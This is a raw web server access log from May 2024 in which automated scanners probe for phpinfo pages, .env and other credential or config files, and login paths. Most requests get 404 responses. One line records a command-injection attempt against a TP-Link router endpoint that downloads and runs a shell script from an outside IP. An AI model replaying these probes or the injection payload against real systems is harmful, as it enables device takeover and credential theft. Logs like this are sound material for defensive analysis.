2.57.169.216 - - [05/May/2024:19:59:05 +0000] "GET /__info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:05 +0000] "GET /_info-backoffice.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:06 +0000] "GET /_info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:07 +0000] "GET /_phpinf.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:07 +0000] "GET /_phpinfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.216 - - [05/May/2024:19:59:08 +0000] "GET /robomongo.json HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:09 +0000] "GET /_poopinfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:09 +0000] "GET /.__info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:09 +0000] "GET /.info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:10 +0000] "GET /0.0_phpinfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:11 +0000] "GET /client_secrets.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:11 +0000] "GET /user-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:12 +0000] "GET /ssh-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:12 +0000] "GET /database-config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:12 +0000] "GET /config/default.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:13 +0000] "GET /config/config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:14 +0000] "GET /00_server_info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:59:15 +0000] "GET /02-info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:59:16 +0000] "GET /credentials/config.json HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:16 +0000] "GET /1_1_PhpInfo.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:16 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:16 +0000] "GET /5info.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:18 +0000] "GET / HTTP/1.1" 200 322 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:18 +0000] "GET /api/index.php/v1/config/application?public=true HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:19 +0000] "GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:20 +0000] "GET /_profiler/open?file=app/config/parameters.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:59:20 +0000] "GET /app/config/parameters.yml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:21 +0000] "GET /config/parameters.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:21 +0000] "GET /parameters.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:21 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:22 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:25 +0000] "GET /phpinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:28 +0000] "GET /info.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:59:28 +0000] "GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0" "-"
2.57.169.217 - - [05/May/2024:19:59:32 +0000] "GET /?phpinfo=1 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:33 +0000] "GET /tool/view/phpinfo.view.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.216 - - [05/May/2024:19:59:35 +0000] "GET /phpinfo HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:35 +0000] "GET /html/phpinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:35 +0000] "GET /?phpinfo=-1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.217 - - [05/May/2024:19:59:35 +0000] "GET /__info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:35 +0000] "GET /_info-backoffice.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:36 +0000] "GET /_info.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
2.57.169.215 - - [05/May/2024:19:59:37 +0000] "GET /_phpinf.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:37 +0000] "GET /_phpinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:38 +0000] "GET /_poopinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:38 +0000] "GET /.__info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:39 +0000] "GET /.info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:39 +0000] "GET /0.0_phpinfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:41 +0000] "GET /00_server_info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.215 - - [05/May/2024:19:59:41 +0000] "GET /02-info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:44 +0000] "GET /1_1_PhpInfo.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36" "-"
2.57.169.216 - - [05/May/2024:19:59:44 +0000] "GET /5info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
2.57.169.217 - - [05/May/2024:19:59:45 +0000] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0" "-"
91.92.244.223 - - [05/May/2024:20:12:07 +0000] "GET //.env HTTP/1.1" 404 153 "-" "Go-http-client/1.1" "-"
185.254.196.173 - - [05/May/2024:20:48:38 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [05/May/2024:20:48:39 +0000] "POST / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
2.58.95.165 - - [05/May/2024:21:40:53 +0000] "GET / HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
2.58.95.165 - - [05/May/2024:21:40:53 +0000] "" 400 0 "-" "-" "-"
176.192.185.61 - - [05/May/2024:21:43:53 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
198.235.24.20 - - [05/May/2024:22:02:49 +0000] "GET / HTTP/1.1" 404 153 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
103.149.34.5 - - [05/May/2024:22:05:50 +0000] "HEAD / HTTP/1.1" 404 0 "-" "-" "-"
103.149.34.5 - - [05/May/2024:22:05:51 +0000] "GET / HTTP/1.1" 404 153 "-" "-" "-"
34.79.162.186 - - [05/May/2024:22:10:17 +0000] "GET / HTTP/1.1" 400 255 "-" "python-requests/2.31.0" "-"
198.235.24.98 - - [05/May/2024:22:12:23 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03D\xFF\x07\x0C\x87\xF1lR\x9F\x10\x02\xCF(\x92\xB6\xECi$\x80G\xC2>\xCD\xFB\xDA\xCD\xF8\xED4\xB4\x04\x18\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
198.235.24.98 - - [05/May/2024:22:12:23 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x95\x7Fa?A\x96\x13\xF8\xBF\xAD\x91\xC1\xDF\x14@\xED\x93\xA2\xC2\x01=\xA1\x90\xA8-\xBB\x12\x90\x91\xA4\xF2[ 3\x1Fd\xF5\x12\xA5v\xB8*\xD0n\x99\xFEFo\xBF\x1F1\x99]!\xCF\xB6\xA3i\xDB\x96\xFD-}\xC7u\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
185.254.196.173 - - [05/May/2024:22:18:58 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [05/May/2024:22:18:59 +0000] "POST / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
177.129.17.69 - - [05/May/2024:22:19:27 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
78.153.140.218 - - [05/May/2024:22:19:45 +0000] "GET /.env HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
18.222.237.181 - - [05/May/2024:22:23:38 +0000] "GET / HTTP/1.1" 200 322 "-" "Nokia6100/1.0 (04.01) Profile/MIDP-1.0 Configuration/CLDC-1.0" "-"
135.125.246.189 - - [05/May/2024:22:28:32 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.246.189 - - [05/May/2024:22:28:32 +0000] "POST / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
141.255.167.250 - - [05/May/2024:22:30:34 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+%2Ftmp%3B+wget+http%3A%2F%2F38.45.200.163%2Fsh+%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh) HTTP/1.1" 404 153 "-" "Go-http-client/1.1" "-"
198.235.24.140 - - [05/May/2024:22:39:41 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03w\xA4\xBF\xC6\xEB)\xEB\xFF\xE9\x18\xCE\xA8\x19}o\x15E\x9B\xB7\xA4\x80\xBA(g\x8B\x11\xFE\x82\xBD]\xB7E\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 157 "-" "-" "-"
198.235.24.140 - - [05/May/2024:22:39:41 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA8t\xB5\xFB@\xE3/\xF7\xAE \xDC?\xC0\xC1c\x1F\xD8\x0B\x1D\xC7\x97\x9C\xAD\xBC\x80t\xBAi+\xFF\xD47 \xDB\x13&\xE7~j\xB9\x10)\xC4\x07\xB1K\x83" 400 157 "-" "-" "-"
185.224.128.43 - - [05/May/2024:22:53:17 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
143.42.61.191 - - [05/May/2024:23:00:44 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" "-"
93.51.11.44 - - [05/May/2024:23:05:27 +0000] "GET / HTTP/1.1" 200 322 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36" "-"
135.125.246.189 - - [05/May/2024:23:09:45 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.246.189 - - [05/May/2024:23:09:46 +0000] "POST / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
212.227.3.10 - - [05/May/2024:23:26:50 +0000] "GET /wp-login.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" "-"
212.227.3.10 - - [05/May/2024:23:27:02 +0000] "GET /wp-login.php HTTP/1.1" 404 3971 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" "-"
185.191.126.213 - - [05/May/2024:23:45:27 +0000] "GET / HTTP/1.1" 404 153 "-" "-" "-"
192.53.123.23 - - [05/May/2024:23:55:28 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFF4|\x18\xA9\x04\xA3B\x8C%\xA2\xDEE\x1C^mU(\xA8\x8C\xB9\xCD\x1E\x87\x0C`f6\x81\xDE0\x18\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
192.53.123.23 - - [05/May/2024:23:55:28 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB5\x81\xAE\xD0\x89\xA0&\xF1\xC9M\xED`\x9B\xE8S{/\xAD\xBEn3S\xEB\xD48\x9BK\xF9St\xF2\xCE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
192.53.123.23 - - [05/May/2024:23:55:28 +0000] "GET / HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /form.html HTTP/1.1" 404 153 "-" "curl/8.1.2" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /upl.php HTTP/1.1" 404 153 "-" "Mozilla/5.0" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x19\x86\x8Eo\x9F\x15\xB6\x9B\x882 \x01\x95\xC3^\xBEG\xD3%\xFEd\x1E\xE9r\x80\xAC5\x93\x9Bs\xF1\xBE\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /geoip/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /1.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /bundle.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /files/ HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /systembc/password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /password.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
192.53.123.23 - - [05/May/2024:23:55:29 +0000] "GET /info.php HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
